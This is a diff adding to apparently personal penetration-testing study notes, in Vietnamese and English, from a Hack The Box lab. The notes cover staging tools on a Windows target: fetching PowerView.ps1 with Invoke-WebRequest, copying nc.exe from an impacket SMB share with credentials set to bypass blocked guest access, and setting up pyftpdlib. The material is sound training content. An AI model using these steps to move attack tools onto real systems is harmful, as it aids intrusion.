@@ -91,4 +91,39 @@ PowerShell Invoke-WebRequest
 From Powershell 3.0 onward, the Invoke-WebRequest is available, but it is noticeably slower at downloading files.
 Nói chung nó ngon hơn PowerShell Web Downloads( Net.WebClient) ở trên
 
+  example : PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+SMB Downloads
+
+Đứng từ windown 
+  C:\htb> copy \\192.168.220.133\share\nc.exe
+          1 file(s) copied.
+      => Khoan, cuộc sống không dễ dàng với bạn như vậy. New version of Windows block unauthenticated guest access.
+  C:\htb> copy \\192.168.220.133\share\nc.exe
+  You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+To transfer files in the scenario, we need set username/password using our impacket SMB and mount the SMB server on our windows target machine 
+Create the SMB Server with a Username and Password
+  naruto3co@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+    [*] Config file parsed
+    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+    [*] Config file parsed
+    [*] Config file parsed
+    [*] Config file parsed
+
+Mount the SMB Server with Username and Password
+  C:\htb> net use n: \\192.168.220.133\share /user:test test
+  The command completed successfully.
+  C:\htb> copy n:\nc.exe
+          1 file(s) copied.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Installing the FTP Server Python3 Module - pyftpdlib
+
+  example : naruto3co@htb[/htb]$ sudo pip3 install pyftpdlib
+
+By default, pyftpdlib using port 2121. Anonymous authentication 
